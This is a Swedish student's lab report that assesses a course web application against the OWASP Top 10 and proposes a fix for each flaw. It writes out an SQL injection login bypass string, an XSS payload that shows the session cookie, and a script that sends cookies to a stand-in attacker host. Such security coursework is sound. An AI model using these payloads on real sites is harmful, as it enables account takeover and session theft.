Ingela Bladh (ib222dp)

# Rapport, Labb 2

## Säkerhetsproblem

### Injektion

Injektion innebär att opålitlig data skickas till en programtolk som en del av ett kommando eller en fråga. Denna 
opålitliga data kan lura programtolken till att utföra kommandon eller ge åtkomst till data utan auktorisering [1, s. 6]. 
Jag kunde i denna applikation logga in genom att ange Bob' OR '1'='1 som lösenord, eftersom sökfrågan blir
SELECT * FROM user WHERE ... password = 'Bob' OR '1'='1';  
Injektion undviks genom att använda parametriserade sökfrågor, eftersom dessa förhindrar förvirring rörande specialtecken 
som '. Till exempel skulle databasen i detta fall sökas igenom för att hitta ett lösenord som innehåller ' OR '1='1 [2]. 
Validering av indata och vitlistning av tecken rekommenderas också, men är inte ett fullständigt skydd eftersom många 
applikationer behöver acceptera specialtecken som indata [1, s. 7].  

### Bristande autentisering och sessionshantering

Funktioner som har med autentisering och sessionshantering att göra implementeras ofta på ett felaktigt sätt. På så 
sätt kan angripare komma över lösenord, nycklar eller sessionstokens, eller utnyttja andra brister i implementationen
för att anta andra användares identiteter [1, s. 6]. I denna applikation förstörs inte sessionen vid utloggning. Detta
betyder att om en användare loggar in på applikationen på en publik dator och sedan loggar ut, så kan en annan användare
komma in på den tidigare användarens konto genom att trycka på bakåt-knappen eller skriva in <.../message> i 
webbläsarens adressfält. I detta fall bör man se till att sessionen förstörs vid utloggning, och att sessionen 
förstörs automatiskt efter en viss tid (eftersom användare kan använda applikationen på en publik dator och sedan stänga 
webbläsaren utan att logga ut) [1, s. 8].

### XSS (cross-site scripting)

XSS-brister uppstår när en applikation accepterar opålitlig data och skickar den till en webbläsare utan ordentlig
validering eller escape-sekvenser. Via XSS kan angripare exekvera skript i offrets webbläsare, vilka kan stjäla 
sessioner, förvanska webbplatser eller dirigera om användaren till skadliga webbplatser [1, s. 6].  
I denna applikation går det att skriva "<a href="#" onclick="alert(document.cookie)">Hej</a> som ett meddelande, 
och när man sedan klickar på länken syns sessionskakan i ett varningsfönster. Detta innebär att en angripare kan stjäla 
en användares sessionskaka och på så sätt få tillgång till dennes konto, genom att skriva till exempel 
"<script>document.location='http://attackersite/'+document.cookie</script>" som ett meddelande [2].  
XSS-brister undviks genom att validera indata och filtrera utdata [3]. Vitlistning av tillåtna tecken rekommenderas men 
är inte ett fullständigt skydd. Vilka escape-sekvenser som bör användas för utdata beror på kontexten som utdatan ska 
placeras i (till exempel HTML, Javasript eller CSS) [1, s. 9].

### Osäkra direkta objektreferenser

En direkt objektreferens inträffar när en utvecklare exponerar en referens till ett internt implementationsobjekt, som
till exempel en fil, en katalog eller en databasnyckel. Vid avsaknad av åtkomstkontroll eller annat skydd kan angripare
manipulera dessa referenser för att få åtkomst till data utan auktorisering [1, s. 6]. I denna applikation exponeras
varje meddelandes databasnyckel i ett dolt fält i HTML-koden, och eftersom ingen åtkomstkontroll görs i funktionerna
som har med radering av meddelanden att göra, skulle en användare kunna radera en annan användares meddelanden.  
Man kan undvika osäkra direkta objektreferenser genom att använda indirekta objektreferenser per användare eller per 
session. Till exempel kan en användare få se en numrerad dropdown-lista med de resurser hen har tillgång till, 
och applikationen kartlägger sedan vilken databasnyckel som numret framför resursen som användaren har valt matchar. Om 
direkta objektreferenser används är det viktigt att kontrollera att användaren är auktoriserad att få tillgång till det 
begärda objektet [1, s. 10].  

### Exponering av känslig data

Känslig data bör inte lagras eller transporteras i klartext. Angripare kan stjäla eller ändra dåligt skyddad data för 
att genomföra till exempel kreditkortsbedrägeri eller identitetsstöld [1, s. 6]. I denna applikation verkar lösenord 
sparas i klartext i databasen.  
Lösenord ska lagras med en algoritm som utformats speciellt för lösenordsskydd, som till exempel bcrypt, PBKDF2 eller 
scrypt [1, s. 12]. De ska inte krypteras utan hashas, eftersom krypterade lösenord kan dekrypteras. För att skydda mot 
att läckta hashade lösenord slås upp mot regnbågstabeller ska ett slumpat salt läggas till varje lösenord. För att 
försvåra "brute force"-attacker kan man hasha lösenordet flera gånger [3].  

### Saknad åtkomstkontroll på funktionsnivå

Utöver åtkomstkontroller på klienten måste applikationer också utföra åtkomstkontroller på servern varje gång en 
funktion anropas. Utan dessa kontroller kommer angripare att via egna anrop kunna komma åt funktionalitet utan
auktorisering [1, s. 6]. I denna applikation kan man komma åt meddelandena utan att logga in, genom att skriva in 
<.../message/data> i webbläsarens adressfält. Detta kan undvikas till exempel genom att lägga till en åtkomstkontroll 
i funktionen "getMessages" i filen "messageModel.js". Det är inte tillräckligt att inte visa länkar eller knappar till 
skyddade funktioner, utan åtkomstkontroller måste också utföras på servern [1, s. 13].

### CSRF (cross-site request forgery)

En CSRF-attack innebär att en inloggad användares webbläsare tvingas att skicka ett förfalskat http-anrop - som innehåller
användarens sessionskaka och annan automatiskt inkluderad autentiseringsinformation - till en sårbar webbapplikation.
På så sätt kan angriparen tvinga användarens webbläsare att skapa anrop som den sårbara applikationen tror är legitima
anrop från användaren [1, s. 6]. Denna applikation verkar inte ha tillräckligt skydd mot CSRF-attacker eftersom det inte
finns några dolda fält med slumpmässigt genererade värden i formulären. 

### Användning av komponenter med kända sårbarheter

Komponenter, som till exempel bibliotek, ramverk och andra programvarumoduler, körs nästan alltid med fullständiga 
rättigheter. Om en sårbar komponent utnyttjas kan en sådan attack medföra allvarlig dataförlust eller serverövertagande.
Om en applikation använder komponenter med kända sårbarheter kan detta undergräva applikationens försvarsmekanismer och
möjliggöra en rad attacker [1, s. 6]. I denna applikation verkar en gammal version av Jquery användas (v 1.10.2).

## Prestandaproblem



## Övergripande reflektioner



## Referenser

[1] * OWASP, "OWASP Top 10 - 2013 - The ten most critical web application security risks", *OWASP*, september 2015   
    * [Online] Tillgänglig: <https://www.owasp.org/index.php/Top10#OWASP_Top_10_for_2013>. [Hämtad: 23 november, 2015].
[2] * M. Coates, "Application Security - Understanding, exploiting and defending against top web vulnerabilities",   
    * *Youtube*, mars 2014 [Online] Tillgänglig: <https://www.youtube.com/watch?v=sY7pUJU8a7U>. [Hämtad: 23 november, 2015].  
[3] * J. Leitet, "Webbteknik II - HT13 - Webbsäkerhet", *Youtube*, november 2013 [Online]  
    * Tillgänglig: <https://www.youtube.com/watch?v=Gc_pc9TMEIk>. [Hämtad: 23 november, 2015].